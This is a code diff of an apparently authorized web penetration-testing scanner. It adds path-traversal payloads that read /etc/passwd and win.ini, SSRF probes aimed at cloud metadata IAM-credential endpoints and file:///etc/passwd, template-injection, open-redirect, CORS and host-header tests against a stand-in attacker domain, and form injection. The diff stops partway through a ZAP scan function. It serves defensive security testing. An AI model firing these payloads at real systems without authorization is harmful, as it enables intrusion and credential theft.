-    def _dedupe_in_scope_urls(self, urls: list, base_url: str, scope_rules: dict | None, max_urls: int = 400) -> list:
-        deduped = []
-        seen = set()
-        for raw in urls:
-            if not raw or not isinstance(raw, str):
-                continue
-            url = raw.split("#", 1)[0].strip()
-            if not url.startswith("http"):
-                url = urljoin(base_url.rstrip("/") + "/", url.lstrip("/"))
-            if not is_url_in_scope(url, base_url, scope_rules):
-                continue
-            if url in seen:
-                continue
-            seen.add(url)
-            deduped.append(url)
-            if len(deduped) >= max_urls:
-                break
-        return deduped
-
-    async def explore_discovered_paths(
-        self,
-        base_url: str,
-        discovered: list,
-        existing_urls: list,
-        scope_rules: dict | None = None,
-        max_paths: int = 30,
-    ) -> list:
-        if not discovered:
-            return []
-
-        seeds = []
-        for hit in discovered:
-            url = str(hit.get("url") or "")
-            status = int(hit.get("status") or 0)
-            if not url:
-                continue
-            if not url.startswith("http"):
-                url = urljoin(base_url.rstrip("/") + "/", url.lstrip("/"))
-            if status not in (200, 204, 301, 302, 307, 401, 403):
-                continue
-            if is_url_in_scope(url, base_url, scope_rules):
-                seeds.append(url)
-
-        seeds = self._dedupe_in_scope_urls(seeds, base_url, scope_rules, max_urls=max_paths)
-        if not seeds:
-            return []
-
-        await self.log(f"Exploring {len(seeds)} discovered content path(s) for links and endpoints", "info")
-        expanded = list(seeds)
-        link_re = re.compile(r'''(?:href|src|action)\s*=\s*["']([^"']+)["']''', re.I)
-
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
-            for seed in seeds:
+                await self.log("ffuf not available; content discovery skipped", "warn")
+                return []
+            for line in stdout.splitlines():
                 try:
-                    response = await c.get(seed)
-                except Exception:
+                    hit = json.loads(line)
+                    url = hit.get("url", "")
+                    if url and url not in found:
+                        found[url] = {"url": url, "status": hit.get("status", 0)}
+                except json.JSONDecodeError:
                     continue
-                content_type = response.headers.get("content-type", "").lower()
-                if response.status_code >= 400 or "html" not in content_type:
-                    continue
-                for match in link_re.findall(response.text[:250000]):
-                    if match.startswith(("mailto:", "tel:", "javascript:", "data:")):
-                        continue
-                    expanded.append(urljoin(str(response.url), match))
+        results = list(found.values())
+        await self.log(f"Content discovery: {len(results)} paths", "success" if results else "info")
+        return results
 
-        expanded = self._dedupe_in_scope_urls(existing_urls + expanded, base_url, scope_rules)
-        added = max(0, len(expanded) - len(set(existing_urls)))
-        await self.log(f"Discovered path exploration added {added} endpoint(s) to active testing set", "success" if added else "info")
-        return expanded
+    # ── Orchestrate the offensive phase ──────────────────────────
+    # ── Path traversal / LFI (active, confirmed file read) ───────
+    async def test_path_traversal(self, urls: list) -> list:
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import httpx
 
-    def _urls_from_declared_paths(self, base_url: str, declared_paths: list) -> list:
-        urls = []
-        for row in declared_paths or []:
-            path = row.get("path") if isinstance(row, dict) else str(row)
-            if not path or not str(path).startswith("/"):
-                continue
-            urls.append(urljoin(base_url.rstrip("/") + "/", str(path).lstrip("/")))
-        return urls
+        param_urls = [u for u in urls if "?" in u and "=" in u][:30]
+        if not param_urls:
+            await self.log("No parameterized URLs to test for path traversal", "info")
+            return []
 
-    def _declared_paths_from_scope_rules(self, scope_rules: dict | None) -> list:
-        rows = []
-        for rule in (scope_rules or {}).get("in_scope", []) or []:
-            if not isinstance(rule, dict):
-                continue
-            ident = str(rule.get("identifier") or "").strip()
-            rule_type = str(rule.get("type") or "").lower().strip()
-            if rule_type in ("path", "url_path") or (ident.startswith("/") and not ident.startswith("//")):
-                rows.append({"path": ident, "hints": []})
-        return rows
+        await self.log(f"Testing {len(param_urls)} endpoints for path traversal / LFI", "info")
 
-    async def check_declared_dependency_hints(self, declared_paths: list, base_url: str) -> list:
-        findings = []
-        candidates = [
-            row for row in declared_paths or []
-            if isinstance(row, dict)
-            and any("vulnerable javascript dependency" in str(h).lower() for h in row.get("hints", []))
+        NIX = "etc/passwd"
+        WIN = "windows/win.ini"
+        depths = ["../", "../../", "../../../", "../../../../",
+                  "../../../../../", "../../../../../../", "../../../../../../../"]
+        payloads = []
+        for d in depths:
+            payloads.append(d + NIX)
+            payloads.append(d + WIN)
+        payloads += [
+            "/etc/passwd",
+            "....//....//....//....//etc/passwd",
+            "..%2f..%2f..%2f..%2fetc%2fpasswd",
+            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+            "..%252f..%252f..%252fetc%252fpasswd",
+            "../../../../etc/passwd%00",
         ]
-        if not candidates:
-            return findings
 
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
-            for row in candidates[:20]:
-                path = row.get("path", "")
-                url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
-                try:
-                    response = await c.get(url)
-                except Exception:
-                    continue
-                if response.status_code >= 400:
-                    continue
+        passwd_re = re.compile(r"root:.*?:0:0:", re.MULTILINE)
+        win_re = re.compile(r"\[(extensions|fonts|mci extensions)\]", re.IGNORECASE)
 
-                parsed = urlparse(url)
-                title = "Outdated JavaScript Dependency Exposed"
-                description = "A JavaScript dependency declared in scope notes was reachable during active testing."
-                if "angular_1-7-7" in parsed.path.lower() or "angular" in parsed.path.lower():
-                    title = "Outdated AngularJS Dependency Exposed"
-                    description = (
-                        "AngularJS 1.x is end-of-life and should not be used in production without compensating controls. "
-                        "The dependency was reachable from the assessed application surface."
-                    )
-
-                findings.append({"type": "dependency", "url": url})
-                await self.add_finding(
-                    title=title,
-                    severity="medium",
-                    description=description,
-                    evidence=f"GET {url} -> HTTP {response.status_code} ({len(response.content)} bytes)",
-                    cvss_score=5.3,
-                    remediation="Upgrade to a maintained framework/version and remove unused legacy JavaScript assets.",
-                )
-
-        await self.log(f"Declared dependency hint checks complete: {len(findings)} result(s)", "success" if findings else "info")
-        return findings
-
-    async def check_declared_vulnerability_hints(
-        self,
-        declared_paths: list,
-        base_url: str,
-        scope_rules: dict | None = None,
-    ) -> list:
-        hint_map = {
-            "sql injection": ("Manual Test Candidate: SQL Injection", "CWE-89, OWASP Injection"),
-            "cross-site scripting": ("Manual Test Candidate: Cross-Site Scripting", "CWE-79, OWASP XSS"),
-            "xss": ("Manual Test Candidate: Cross-Site Scripting", "CWE-79, OWASP XSS"),
-            "xml external entity": ("Manual Test Candidate: XML External Entity", "CWE-611, OWASP XXE"),
-            "xxe": ("Manual Test Candidate: XML External Entity", "CWE-611, OWASP XXE"),
-            "open redirection": ("Manual Test Candidate: Open Redirect", "CWE-601"),
-            "prototype pollution": ("Manual Test Candidate: Prototype Pollution", "CWE-1321"),
-            "template injection": ("Manual Test Candidate: Template Injection", "CWE-94/CWE-1336"),
-            "header injection": ("Manual Test Candidate: HTTP Response Header Injection", "CWE-113"),
-            "dom data manipulation": ("Manual Test Candidate: DOM Data Manipulation", "DOM-based client-side issue"),
-            "link manipulation": ("Manual Test Candidate: Link Manipulation", "DOM-based client-side issue"),
-            "request url override": ("Manual Test Candidate: Request URL Override", "client-side request control"),
-            "base64-encoded data": ("Manual Test Candidate: Encoded Parameter Handling", "encoded input attack surface"),
-        }
-        rows = []
-        for row in declared_paths or []:
-            if not isinstance(row, dict):
-                continue
-            hints = [str(h) for h in row.get("hints", []) if str(h).strip()]
-            if hints:
-                rows.append((row.get("path", ""), hints))
-        if not rows:
-            return []
-
-        candidates = []
+        findings = []
         seen = set()
-        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True) as c:
-            for path, hints in rows[:80]:
-                if not path or not str(path).startswith("/"):
-                    continue
-                url = urljoin(base_url.rstrip("/") + "/", str(path).lstrip("/"))
-                if not is_url_in_scope(url, base_url, scope_rules):
-                    continue
-                try:
-                    response = await c.get(url)
-                except Exception:
-                    continue
-                if response.status_code >= 500:
-                    continue
-                for hint in hints:
-                    low_hint = hint.lower()
-                    matched = next((v for k, v in hint_map.items() if k in low_hint), None)
-                    if not matched:
-                        continue
-                    title, mapping = matched
-                    key = (title, url)
+        budget = 350
+
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True, headers=self._auth_headers()) as c:
+            for u in param_urls:
+                parsed = urlparse(u)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                for pname in list(params.keys())[:3]:
+                    key = (parsed.netloc, parsed.path, pname)
                     if key in seen:
                         continue
                     seen.add(key)
-                    candidates.append({"url": url, "hint": hint, "status": response.status_code})
-                    await self.add_finding(
-                        title=f"{title}: {urlparse(url).path or '/'}",
-                        severity="low",
-                        description=(
-                            "The authorized scope notes identify this reachable endpoint as a candidate "
-                            "for manual validation. Yggdrasil has not confirmed exploitability here; "
-                            "this preserves the testing lead when automated tools miss it."
-                        ),
-                        evidence=(
-                            f"Scope hint: {hint}\n"
-                            f"GET {url} -> HTTP {response.status_code} ({len(response.content)} bytes)\n"
-                            f"Mapping: {mapping}"
-                        ),
-                        cvss_score=3.1,
-                        remediation="Manually validate the endpoint, then remediate with the control appropriate to the confirmed weakness.",
+                    hit = None
+                    for pl in payloads:
+                        if budget <= 0:
+                            break
+                        budget -= 1
+                        mutated = dict(params)
+                        mutated[pname] = [pl]
+                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
+                        try:
+                            r = await c.get(target)
+                        except Exception:
+                            continue
+                        body = r.text or ""
+                        m = passwd_re.search(body)
+                        if m:
+                            hit = ("*nix /etc/passwd", pl, "critical", 9.1, m.group(0))
+                            break
+                        if "win.ini" in pl.lower():
+                            wm = win_re.search(body)
+                            if wm:
+                                hit = ("Windows win.ini", pl, "high", 7.5, wm.group(0))
+                                break
+                    if hit:
+                        label, pl, sev, cvss, snippet = hit
+                        findings.append({"param": pname, "payload": pl, "url": u, "file": label})
+                        _f = await self.add_finding(
+                            title=f"Path Traversal / LFI: {pname}",
+                            severity=sev,
+                            description=(f"Parameter '{pname}' is vulnerable to path traversal. Injecting a "
+                                         f"traversal sequence returned the contents of a protected system "
+                                         f"file ({label}), confirming arbitrary file read."),
+                            evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\nLeaked: {snippet[:200]}",
+                            cvss_score=cvss,
+                            remediation=("Reject path separators and traversal sequences in file parameters. "
+                                         "Resolve the canonical path and confirm it stays within an allowed "
+                                         "base directory. Prefer an allowlist of identifiers mapped "
+                                         "server-side to filenames."),
+                        )
+                        await self.capture(r, finding_id=(_f.id if _f else None),
+                                           notes=f"Confirmed path traversal on parameter '{pname}' ({label})")
+                    if budget <= 0:
+                        await self.log("Path traversal request budget reached; stopping early", "warn")
+                        break
+
+        await self.log(f"Path traversal testing complete: {len(findings)} confirmed",
+                       "success" if findings else "info")
+        return findings
+
+    # ── Generic single-parameter probe ───────────────────────────
+    async def _param_probe(self, urls, payloads, detector, name_filter=None,
+                           cap=30, per_params=3, follow=True) -> list:
+        """For each parameterized URL, replace one parameter at a time with each
+        payload, request it, and run detector(payload, response) -> dict|None.
+        Shared by the SSRF, SSTI and open-redirect probes."""
+        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+        import httpx
+
+        param_urls = [u for u in urls if "?" in u and "=" in u][:cap]
+        findings, seen = [], set()
+        if not param_urls:
+            return findings
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=follow,
+                                     headers=self._auth_headers()) as c:
+            for u in param_urls:
+                parsed = urlparse(u)
+                params = parse_qs(parsed.query, keep_blank_values=True)
+                names = [n for n in params if (name_filter is None or n.lower() in name_filter)]
+                for pname in names[:per_params]:
+                    key = (parsed.netloc, parsed.path, pname.lower())
+                    if key in seen:
+                        continue
+                    seen.add(key)
+                    for pl in payloads:
+                        mutated = dict(params)
+                        mutated[pname] = [pl]
+                        target = urlunparse(parsed._replace(query=urlencode(mutated, doseq=True)))
+                        try:
+                            r = await c.get(target)
+                        except Exception:
+                            continue
+                        verdict = detector(pl, r)
+                        if verdict:
+                            findings.append({"param": pname, "url": u, "payload": pl})
+                            f = await self.add_finding(
+                                title=f"{verdict['title']}: {pname}",
+                                severity=verdict["severity"],
+                                description=verdict["description"],
+                                evidence=f"URL: {u}\nParameter: {pname}\nPayload: {pl}\n{verdict.get('evidence','')}",
+                                cvss_score=verdict["cvss"],
+                                remediation=verdict["remediation"],
+                            )
+                            await self.capture(r, finding_id=(f.id if f else None),
+                                               notes=f"Confirmed {verdict['title']} on parameter '{pname}'")
+                            break
+        return findings
+
+    # ── Shared injection detector ────────────────────────────────
+    def _injection_verdict(self, pl, r):
+        """Classify one response to a crafted payload. Shared by the query-param
+        auto-fuzz and the form probe. Returns a finding dict or None."""
+        from core.replay import ERROR_SIGNATURES
+        try:
+            body = r.text or ""
+        except Exception:
+            body = ""
+        low = body.lower()
+        errs = [s for s in ERROR_SIGNATURES if s in low]
+        if errs:
+            return {
+                "title": "Parameter Injection Signal (server error)",
+                "severity": "medium", "cvss": 5.3,
+                "description": ("A crafted value triggered a server-side error signature "
+                                f"('{errs[0]}'), indicating the input is not safely handled "
+                                "(possible SQL/command injection). Confirm with the workbench."),
+                "evidence": f"Error signature: {errs[0]} | HTTP {r.status_code}",
+                "remediation": "Use parameterized queries / safe APIs and validate input.",
+            }
+        if XSS_CANARY in pl and f"<{XSS_CANARY}>" in body:
+            return {
+                "title": "Reflected Input (possible reflected XSS)",
+                "severity": "low", "cvss": 4.0,
+                "description": ("The value is reflected unencoded in the response — the prerequisite "
+                                "for reflected XSS. Confirm the injection context."),
+                "evidence": f"Canary reflected unencoded | HTTP {r.status_code}",
+                "remediation": "Context-encode all output; apply a strict CSP.",
+            }
+        if "etc/passwd" in pl and "root:x:0:0" in body:
+            return {
+                "title": "Path Traversal (arbitrary file read)",
+                "severity": "high", "cvss": 7.5,
+                "description": "The input allowed reading /etc/passwd via directory traversal.",
+                "evidence": "Response contains /etc/passwd contents (root:x:0:0:)",
+                "remediation": "Never build file paths from user input; use an allowlist / canonicalize.",
+            }
+        return None
+
+    # ── Auto-fuzz: fast deterministic injection-signal sweep ─────
+    async def auto_fuzz(self, urls: list) -> list:
+        """Fire the injection payload set at every query parameter, flagging error
+        signatures, unencoded reflection, and file-read markers. Reuses _param_probe."""
+        return await self._param_probe(urls, INJECT_PAYLOADS, self._injection_verdict,
+                                       cap=25, per_params=4)
+
+    # ── Form discovery + POST/body injection ─────────────────────
+    async def discover_forms(self, urls: list, cap_pages: int = 25) -> list:
+        """Fetch crawled pages, parse their <form>s, and return testable specs
+        {method, url, fields}. This is the POST/body attack surface — logins,
+        searches, checkout — that a URL-only crawler never exposes."""
+        import httpx
+        specs, seen = [], set()
+        pages = list(dict.fromkeys(urls))[:cap_pages]
+        if not pages:
+            return specs
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for page in pages:
+                    try:
+                        r = await c.get(page)
+                    except Exception:
+                        continue
+                    if "html" not in r.headers.get("content-type", "").lower():
+                        continue
+                    ex = _FormExtractor()
+                    try:
+                        ex.feed(r.text or "")
+                    except Exception:
+                        continue
+                    for form in ex.forms:
+                        if not form["fields"]:
+                            continue
+                        action_url = urljoin(page, form["action"]) if form["action"] else page
+                        if not _host_ok(action_url, page):   # stay on the crawled host
+                            continue
+                        key = (form["method"], action_url, tuple(sorted(form["fields"])))
+                        if key in seen:
+                            continue
+                        seen.add(key)
+                        specs.append({"method": form["method"].upper(), "url": action_url,
+                                      "fields": form["fields"]})
+        except Exception as e:
+            await self.log(f"Form discovery skipped: {e}", "warn")
+        if specs:
+            await self.log(f"Form discovery: {len(specs)} testable form(s) "
+                           f"({sum(1 for s in specs if s['method'] == 'POST')} POST)", "info")
+        return specs
+
+    async def test_forms(self, form_specs: list) -> list:
+        """Inject the payload set into each form field (POST or GET) and flag the
+        same signals as auto_fuzz — this is where login-form SQLi and search XSS
+        surface. Findings + the proving request are captured as evidence."""
+        import httpx
+        findings, seen = [], set()
+        specs = (form_specs or [])[:20]
+        if not specs:
+            return findings
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                for spec in specs:
+                    method, url, fields = spec["method"], spec["url"], spec["fields"]
+                    for field in fields[:8]:
+                        key = (method, url, field)
+                        if key in seen:
+                            continue
+                        seen.add(key)
+                        for pl in INJECT_PAYLOADS:
+                            data = {f: (pl if f == field else "test") for f in fields}
+                            try:
+                                if method == "POST":
+                                    r = await c.post(url, data=data)
+                                else:
+                                    r = await c.get(url, params=data)
+                            except Exception:
+                                continue
+                            verdict = self._injection_verdict(pl, r)
+                            if verdict:
+                                _f = await self.add_finding(
+                                    title=f"{verdict['title']}: {field} (form {method})",
+                                    severity=verdict["severity"],
+                                    description=verdict["description"],
+                                    evidence=(f"Form: {method} {url}\nField: {field}\nPayload: {pl}\n"
+                                              f"{verdict.get('evidence', '')}"),
+                                    cvss_score=verdict["cvss"],
+                                    remediation=verdict["remediation"],
+                                )
+                                await self.capture(
+                                    r, finding_id=(_f.id if _f else None),
+                                    notes=f"{verdict['title']} on form field '{field}' ({method} {url})")
+                                findings.append({"field": field, "url": url, "method": method, "payload": pl})
+                                break
+        except Exception as e:
+            await self.log(f"Form testing error: {e}", "warn")
+        if findings:
+            await self.log(f"Form testing: {len(findings)} injection signal(s) on form fields", "success")
+        return findings
+
+    # ── SSRF (in-band: cloud metadata / file read) ───────────────
+    async def test_ssrf(self, urls: list) -> list:
+        await self.log("Probing parameters for SSRF (cloud metadata / file read)", "info")
+        canaries = [
+            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "http://metadata.google.internal/computeMetadata/v1/instance/",
+            "file:///etc/passwd",
+        ]
+        aws_gcp = ("security-credentials", "ami-id", "instance-id", "iam/",
+                   "computeMetadata", "project-id", "meta-data")
+
+        def det(pl, r):
+            body = r.text or ""
+            if pl.startswith("file:"):
+                m = re.search(r"root:.*?:0:0:", body)
+                if m:
+                    return {"title": "Server-Side Request Forgery (file read)", "severity": "high",
+                            "cvss": 8.6,
+                            "description": "A URL parameter fetched a local file via the file:// scheme, "
+                                           "confirming server-side request forgery with local file read.",
+                            "remediation": "Allowlist outbound URL schemes/hosts; block file:// and internal "
+                                           "addresses; resolve and validate the target before fetching.",
+                            "evidence": f"Leaked: {m.group(0)[:120]}"}
+                return None
+            if any(s in body for s in aws_gcp):
+                return {"title": "Server-Side Request Forgery (cloud metadata)", "severity": "high",
+                        "cvss": 8.6,
+                        "description": "A URL parameter caused the server to fetch a cloud metadata endpoint, "
+                                       "exposing instance metadata and potentially IAM credentials.",
+                        "remediation": "Block requests to link-local/metadata IPs (169.254.169.254), enforce "
+                                       "IMDSv2, and allowlist outbound hosts.",
+                        "evidence": "Cloud metadata signature reflected in the response body."}
+            return None
+
+        f = await self._param_probe(urls, canaries, det, name_filter=SSRF_PARAMS, cap=30, follow=True)
+        await self.log(f"SSRF probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── SSTI (template evaluation) ───────────────────────────────
+    async def test_ssti(self, urls: list) -> list:
+        await self.log("Probing parameters for server-side template injection", "info")
+        marker = "1787569"  # 1337*1337, distinctive so a natural match is unlikely
+        payloads = ["${1337*1337}", "{{1337*1337}}", "<%= 1337*1337 %>", "#{1337*1337}",
+                    "${{1337*1337}}", "*{1337*1337}"]
+
+        def det(pl, r):
+            if marker in (r.text or ""):
+                return {"title": "Server-Side Template Injection", "severity": "high", "cvss": 9.0,
+                        "description": "A template expression injected into this parameter was evaluated "
+                                       "server-side (1337*1337 rendered as 1787569), confirming SSTI. "
+                                       "This frequently leads to remote code execution.",
+                        "remediation": "Never pass user input into template engines. Use logic-less "
+                                       "templates or strict sandboxing and context-aware escaping.",
+                        "evidence": "Template expression evaluated to 1787569 in the response."}
+            return None
+
+        f = await self._param_probe(urls, payloads, det, name_filter=None, cap=30, follow=True)
+        await self.log(f"SSTI probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── Open redirect ────────────────────────────────────────────
+    async def test_open_redirect(self, urls: list) -> list:
+        await self.log("Probing redirect parameters for open redirect", "info")
+        evil = "evil-yggdrasil.example"
+        payloads = [f"https://{evil}", f"//{evil}", f"https:/{evil}", f"/\\{evil}"]
+
+        def det(pl, r):
+            loc = r.headers.get("location", "")
+            # The attacker host is a made-up domain, so its presence in the
+            # redirect target is itself proof the parameter controls the redirect.
+            if loc and evil in loc.lower():
+                return {"title": "Open Redirect", "severity": "medium", "cvss": 5.4,
+                        "description": "A redirect parameter sent the browser to an attacker-controlled "
+                                       "external domain, enabling phishing and OAuth token theft.",
+                        "remediation": "Allowlist redirect targets or use relative paths only; never redirect "
+                                       "to a raw user-supplied URL.",
+                        "evidence": f"Location: {loc[:200]}"}
+            return None
+
+        f = await self._param_probe(urls, payloads, det, name_filter=REDIRECT_PARAMS,
+                                    cap=40, follow=False)
+        await self.log(f"Open-redirect probing complete: {len(f)} confirmed", "success" if f else "info")
+        return f
+
+    # ── CORS misconfiguration ────────────────────────────────────
+    async def test_cors(self, base_url: str, urls: list) -> list:
+        import httpx
+        await self.log("Testing CORS policy for arbitrary-origin reflection", "info")
+        evil = "https://evil-yggdrasil.example"
+        targets = list(dict.fromkeys([base_url] + [u for u in urls if "/api" in u or "?" not in u]))[:20]
+        findings = []
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
+                                     headers=self._auth_headers()) as c:
+            for u in targets:
+                try:
+                    r = await c.get(u, headers={"Origin": evil})
+                except Exception:
+                    continue
+                acao = r.headers.get("access-control-allow-origin", "")
+                acac = r.headers.get("access-control-allow-credentials", "").lower()
+                if acao == evil:
+                    sev = "high" if acac == "true" else "medium"
+                    cvss = 7.4 if acac == "true" else 5.3
+                    findings.append({"url": u, "creds": acac == "true"})
+                    _f = await self.add_finding(
+                        title=f"CORS Misconfiguration (reflected origin{' + credentials' if acac == 'true' else ''})",
+                        severity=sev,
+                        description="The server reflects an arbitrary Origin in Access-Control-Allow-Origin"
+                                    + (" with Access-Control-Allow-Credentials: true, letting any site read "
+                                       "authenticated responses (account takeover)." if acac == "true"
+                                       else ", allowing any site to read the response."),
+                        evidence=f"URL: {u}\nOrigin: {evil}\nAccess-Control-Allow-Origin: {acao}\n"
+                                 f"Access-Control-Allow-Credentials: {acac or '(unset)'}",
+                        cvss_score=cvss,
+                        remediation="Reflect only an allowlist of trusted origins; never combine a reflected "
+                                    "origin with credentials; avoid dynamic ACAO based on the Origin header.",
                     )
+                    await self.capture(r, finding_id=(_f.id if _f else None),
+                                       notes=f"Arbitrary Origin {evil} reflected in ACAO")
+        await self.log(f"CORS testing complete: {len(findings)} misconfiguration(s)",
+                       "success" if findings else "info")
+        return findings
 
-        await self.log(f"Declared vulnerability hint checks complete: {len(candidates)} manual candidate(s)", "success" if candidates else "info")
-        return candidates
+    # ── Host header injection ────────────────────────────────────
+    async def test_host_header(self, base_url: str) -> list:
+        import httpx
+        await self.log("Testing for host header injection / poisoning", "info")
+        evil = "evil-yggdrasil.example"
+        findings = []
+        async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=False,
+                                     headers=self._auth_headers()) as c:
+            for hdr in ("Host", "X-Forwarded-Host"):
+                try:
+                    r = await c.get(base_url, headers={hdr: evil})
+                except Exception:
+                    continue
+                loc = r.headers.get("location", "")
+                body = (r.text or "")[:4000]
+                if evil in loc or evil in body:
+                    findings.append({"header": hdr})
+                    _f = await self.add_finding(
+                        title=f"Host Header Injection ({hdr})",
+                        severity="medium",
+                        description="A spoofed host header was reflected into a redirect or the response body. "
+                                    "This enables web-cache poisoning and password-reset link poisoning "
+                                    "(account takeover via reset emails pointing at an attacker domain).",
+                        evidence=f"{hdr}: {evil}\nReflected in: {'Location header' if evil in loc else 'response body'}",
+                        cvss_score=6.1,
+                        remediation="Validate the Host header against an allowlist; build absolute URLs from a "
+                                    "configured canonical hostname, never from the request Host/X-Forwarded-Host.",
+                    )
+                    await self.capture(r, finding_id=(_f.id if _f else None),
+                                       notes=f"Spoofed {hdr}: {evil} reflected")
+                    break
+        await self.log(f"Host-header testing complete: {len(findings)} finding(s)",
+                       "success" if findings else "info")
+        return findings
 
-    async def run_offensive(
-        self,
-        base_url: str,
-        scope_rules: dict | None = None,
-        options: dict | None = None,
-        declared_paths: list | None = None,
-    ) -> dict:
-        options = options or {}
-        await self.log(f"⚔ Offensive engine engaged against {base_url}", "info")
-        declared_paths = list(declared_paths or [])
-        if not declared_paths:
-            declared_paths = self._declared_paths_from_scope_rules(scope_rules)
-        urls = self._dedupe_in_scope_urls(await self.crawl(base_url), base_url, scope_rules)
-        declared_seed_urls = self._urls_from_declared_paths(base_url, declared_paths or [])
-        if declared_seed_urls:
-            declared_seed_urls = self._dedupe_in_scope_urls(declared_seed_urls, base_url, scope_rules)
-            await self.log(f"Using {len(declared_seed_urls)} declared scope path(s) as active test seeds", "info")
-            urls = self._dedupe_in_scope_urls(urls + declared_seed_urls, base_url, scope_rules)
-        if base_url not in urls:
-            urls.insert(0, base_url)
-        spider_urls = await self.spider_http(base_url, urls, scope_rules)
-        if spider_urls:
-            urls = self._dedupe_in_scope_urls(urls + spider_urls, base_url, scope_rules)
-        lab_mode = bool(
-            options.get("lab_mode")
-            or os.getenv("YGGDRASIL_LAB_MODE", "").lower() in ("1", "true", "yes")
-            or os.getenv("OLYMPUS_LAB_MODE", "").lower() in ("1", "true", "yes")
+    # ── Active parameter mining (arjun style) ────────────────────
+    async def mine_params(self, base_url: str) -> list:
+        """Discover hidden parameters the app processes by probing candidate names
+        and watching for the injected value being reflected. Returns synthesized
+        param URLs so the injection probes then test the newly found params."""
+        import httpx
+
+        canary = "olymz9x7q"
+        try:
+            async with httpx.AsyncClient(timeout=8, verify=False, follow_redirects=True,
+                                         headers=self._auth_headers()) as c:
+                base = await c.get(base_url)
+                base_reflects = canary in (base.text or "")
+                if base_reflects:
+                    return []  # site echoes anything; reflection test is meaningless
+
+                sem = asyncio.Semaphore(20)
+                sep = "&" if "?" in base_url else "?"
+
+                async def probe(cand):
+                    async with sem:
+                        try:
+                            r = await c.get(f"{base_url}{sep}{cand}={canary}")
+                        except Exception:
+                            return None
+                        return cand if canary in (r.text or "") else None
+
+                results = await asyncio.gather(*[probe(cand) for cand in PARAM_MINE_CANDIDATES])
+        except Exception:
+            return []
+
+        found = [c for c in results if c]
+        if not found:
+            await self.log("Param mining: no hidden reflected parameters", "info")
+            return []
+        await self.log(
+            f"Param mining: {len(found)} hidden reflected parameter(s): {', '.join(found[:15])}",
+            "success",
         )
-        auth_profiles = options.get("auth_profiles") or {}
+        sep = "&" if "?" in base_url else "?"
+        return [f"{base_url}{sep}{c}=1" for c in found]
 
-        # Run content discovery before injection/access-control modules so discovered
-        # paths become real test inputs rather than only a final counter.
-        async def _run_module(label: str, coro):
-            try:
-                result = await coro
-                if not isinstance(result, list):
-                    await self.log(f"{label} module returned {type(result).__name__}; treating as no results", "warn")
+    # ── OWASP ZAP active scan (full DAST) ────────────────────────
+    async def zap_active_scan(self, base_url: str, seed_urls: list = None) -> list:
+        import httpx
+
+        zap_url = os.getenv("ZAP_URL", "http://zap:8090").rstrip("/")
+        api_key = os.getenv("ZAP_API_KEY", "")
+        if not zap_url:
+            return []
+
+        def _p(params):
+            p = dict(params)
+            if api_key:
+                p["apikey"] = api_key
+            return p
+
+        async def _get(c, path, params):
+            r = await c.get(f"{zap_url}{path}", params=_p(params))
+            r.raise_for_status()
+            return r.json()
+
+        findings = []
+        try:
+            async with httpx.AsyncClient(timeout=30, verify=False) as c:
+                # ZAP may still be booting when the first mission runs.
+                ready = False
+                for _ in range(6):
+                    try:
+                        await _get(c, "/JSON/core/view/version/", {})
+                        ready = True
+                        break
+                    except Exception:
+                        await asyncio.sleep(5)
+                if not ready:
+                    await self.log("OWASP ZAP not reachable; skipping ZAP active scan", "warn")
                     return []
-                await self.log(f"{label} module complete: {len(result)} result(s)", "info")
-                return result
-            except Exception as e:
-                await self.log(f"{label} module failed: {type(e).__name__}: {str(e)[:240]}", "warn")
-                return []
 
-        param_mining = await _run_module("ParamSpider-style parameter mining", self.paramspider_parameter_mining(base_url, scope_rules))
-        if param_mining:
-            urls = self._dedupe_in_scope_urls(urls + param_mining, base_url, scope_rules)
+                ver = (await _get(c, "/JSON/core/view/version/", {})).get("version", "?")
+                await self.log(f"OWASP ZAP {ver} online; seeding target", "info")
 
-        disco = await _run_module("Content discovery", self.content_discovery(base_url, urls))
-        expanded_urls = await self.explore_discovered_paths(base_url, disco, urls, scope_rules)
-        if expanded_urls:
-            urls = expanded_urls
-            followup_spider_urls = await self.spider_http(base_url, urls, scope_rules, max_pages=40)
-            if followup_spider_urls:
-                urls = self._dedupe_in_scope_urls(urls + followup_spider_urls, base_url, scope_rules)
+                # Authenticated scan: inject the session cookie on every ZAP request.
+                if self._cookie():
+                    try:
+                        await _get(c, "/JSON/replacer/action/addRule/", {
+                            "description": "yggdrasil-auth-cookie", "enabled": "true",
+                            "matchType": "REQ_HEADER", "matchString": "Cookie",
+                            "matchRegex": "false", "replacement": self._cookie(),
+                        })
+                        await self.log("ZAP: authenticated session cookie applied to all requests", "info")
+                    except Exception:
+                        await self.log("ZAP: could not apply auth cookie (replacer add-on missing?)", "warn")
 
-        generated_param_urls = self.generate_parameter_test_urls(
-            base_url,
-            urls,
-            declared_paths=declared_paths,
-            scope_rules=scope_rules,
-        )
-        if generated_param_urls:
-            # Put generated candidates first so capped tools exercise the high-value route/parameter matrix.
-            urls = self._dedupe_in_scope_urls(generated_param_urls + urls, base_url, scope_rules, max_urls=900)
+                await _get(c, "/JSON/core/action/accessUrl/", {"url": base_url, "followRedirects": "true"})
+
+                # Import the endpoints our own crawl already found (same host) into
+                # ZAP's site tree. accessUrl fetches each so its params land in the
+                # tree and the active scanner tests every discovered URL, including
+                # JS/SPA routes the ZAP spider alone would miss.
